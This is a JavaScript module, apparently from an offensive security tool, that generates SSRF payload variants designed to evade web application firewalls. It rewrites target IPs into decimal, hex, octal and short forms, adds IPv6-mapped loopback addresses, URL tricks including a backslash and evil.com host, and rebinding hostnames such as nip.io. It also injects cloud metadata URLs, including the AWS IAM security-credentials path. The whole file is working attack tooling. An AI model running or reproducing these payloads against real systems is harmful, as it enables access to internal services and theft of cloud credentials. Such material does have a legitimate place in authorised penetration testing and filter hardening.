/**
 * SSRF WAF Bypass Engine
 * Generates multiple evasion variants for SSRF payloads.
 * Supports: HTTP, Cloud Metadata
 */

import { ipToDecimal, ipToHex, ipToOctal, urlEncode } from '../utils/encoding'
import { extractIp, extractPath, parseUrl, pickOne } from '../utils/helpers'

/* ── IP Decimal Notation ──────────────────────────── */
function applyIpDecimal(payload) {
  const variants = []
  const ip = extractIp(payload)
  if (!ip) return [payload]

  const decimal = ipToDecimal(ip)
  const path = extractPath(payload)

  // http://2130706433/path
  variants.push(payload.replace(ip, String(decimal)))

  // With explicit port
  const parsed = parseUrl(payload)
  if (parsed.valid && parsed.port) {
    variants.push(`${parsed.protocol}//${decimal}:${parsed.port}${path}`)
  }

  return variants
}

/* ── IP Hex Notation ──────────────────────────────── */
function applyIpHex(payload) {
  const variants = []
  const ip = extractIp(payload)
  if (!ip) return [payload]

  const hex = ipToHex(ip)
  const path = extractPath(payload)

  // http://0x7f000001/path
  variants.push(payload.replace(ip, hex))

  // Per-octet hex: 0x7f.0x00.0x00.0x01
  const perOctet = ip.split('.').map(p => '0x' + Number(p).toString(16).padStart(2, '0')).join('.')
  variants.push(payload.replace(ip, perOctet))

  return variants
}

/* ── IP Octal Notation ────────────────────────────── */
function applyIpOctal(payload) {
  const variants = []
  const ip = extractIp(payload)
  if (!ip) return [payload]

  const octal = ipToOctal(ip)
  // http://0177.0000.0000.0001/path
  variants.push(payload.replace(ip, octal))

  // Mixed notation: first octet as octal, rest as decimal
  const parts = ip.split('.')
  const mixed = '0' + Number(parts[0]).toString(8) + '.' + parts.slice(1).join('.')
  variants.push(payload.replace(ip, mixed))

  return variants
}

/* ── IP Short Forms ───────────────────────────────── */
function applyIpShort(payload) {
  const variants = []
  const ip = extractIp(payload)
  if (!ip) return [payload]
  const path = extractPath(payload)

  // Check if it's a loopback address
  if (ip === '127.0.0.1' || ip.startsWith('127.')) {
    // http://127.1
    variants.push(payload.replace(ip, '127.1'))
    // http://0/
    variants.push(payload.replace(ip, '0'))
    // http://0.0.0.0
    variants.push(payload.replace(ip, '0.0.0.0'))
    // localhost
    variants.push(payload.replace(ip, 'localhost'))
    // [::1] IPv6 loopback
    variants.push(payload.replace(ip, '[::1]'))
    // [::ffff:127.0.0.1] IPv6 mapped
    variants.push(payload.replace(ip, '[::ffff:127.0.0.1]'))
    // [0:0:0:0:0:ffff:127.0.0.1]
    variants.push(payload.replace(ip, '[0:0:0:0:0:ffff:127.0.0.1]'))
  } else {
    // Generic IP shortening: strip trailing .0 octets
    const parts = ip.split('.')
    if (parts[3] === '0') {
      variants.push(payload.replace(ip, parts.slice(0, 3).join('.')))
    }
    // [::ffff:IP]
    variants.push(payload.replace(ip, `[::ffff:${ip}]`))
  }

  return variants
}

/* ── URL Obfuscation Tricks ───────────────────────── */
function applyUrlTricks(payload) {
  const variants = []
  const parsed = parseUrl(payload)
  if (!parsed.valid) return [payload]

  const ip = extractIp(payload)
  const path = extractPath(payload)
  const host = ip || parsed.hostname

  // Embedded credentials: http://evil@target/path
  variants.push(`${parsed.protocol}//anything@${host}${path}`)

  // URL-encoded host
  variants.push(`${parsed.protocol}//${urlEncode(host)}${path}`)

  // Backslash trick: http://host\@evil.com
  variants.push(`${parsed.protocol}//${host}\\@evil.com${path}`)

  // Fragment trick
  variants.push(`${parsed.protocol}//${host}${path}#`)

  // Double slash in path
  variants.push(`${parsed.protocol}//${host}//${path.replace(/^\//, '')}`)

  // URL with port 80 explicitly
  if (!parsed.port) {
    variants.push(`${parsed.protocol}//${host}:80${path}`)
    variants.push(`${parsed.protocol}//${host}:443${path}`)
  }

  return variants
}

/* ── DNS / Redirect Bypass ────────────────────────── */
function applyDnsRedirect(payload) {
  const variants = []
  const ip = extractIp(payload)
  const path = extractPath(payload)

  if (ip === '127.0.0.1' || ip?.startsWith('127.')) {
    // [::] IPv6 unspecified
    variants.push(payload.replace(ip, '[::]'))
    // 0.0.0.0
    variants.push(payload.replace(ip, '0.0.0.0'))
    // localtest.me (resolves to 127.0.0.1)
    variants.push(payload.replace(ip, 'localtest.me'))
    // spoofed.burpcollaborator.net style
    variants.push(payload.replace(ip, 'spoofed.burpcollaborator.net'))
    // nip.io
    variants.push(payload.replace(ip, '127.0.0.1.nip.io'))
    // sslip.io
    variants.push(payload.replace(ip, '127.0.0.1.sslip.io'))
  }

  // Cloud metadata endpoints
  const cloudVariants = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
  ]

  // Add cloud metadata if payload looks like it targets internal services
  if (payload.includes('169.254') || payload.includes('metadata') || payload.includes('127.0.0.1')) {
    cloudVariants.forEach(cv => {
      if (cv !== payload) variants.push(cv)
    })
  }

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateSsrfVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('ip-decimal')) {
    applyIpDecimal(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'IP Decimal', layers: ['ip-decimal'] })
    })
  }

  if (layers.includes('ip-hex')) {
    applyIpHex(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'IP Hex', layers: ['ip-hex'] })
    })
  }

  if (layers.includes('ip-octal')) {
    applyIpOctal(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'IP Octal', layers: ['ip-octal'] })
    })
  }

  if (layers.includes('ip-short')) {
    applyIpShort(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'IP Short', layers: ['ip-short'] })
    })
  }

  if (layers.includes('url-tricks')) {
    applyUrlTricks(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'URL Tricks', layers: ['url-tricks'] })
    })
  }

  if (layers.includes('dns-redirect')) {
    applyDnsRedirect(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'DNS/Redirect', layers: ['dns-redirect'] })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('ip-decimal') && layers.includes('url-tricks')) {
      const ip = extractIp(payload)
      if (ip) {
        const decimal = ipToDecimal(ip)
        const path = extractPath(payload)
        const parsed = parseUrl(payload)
        if (parsed.valid) {
          const combo = `${parsed.protocol}//anything@${decimal}${path}`
          allVariants.push({ payload: combo, label: 'Decimal + URL Trick', layers: ['ip-decimal', 'url-tricks'] })
        }
      }
    }

    if (layers.includes('ip-hex') && layers.includes('ip-short')) {
      const ip = extractIp(payload)
      if (ip === '127.0.0.1') {
        const combo = payload.replace(ip, '0x7f000001')
        allVariants.push({ payload: combo, label: 'Hex + Short', layers: ['ip-hex', 'ip-short'] })
      }
    }
  }

  // Deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
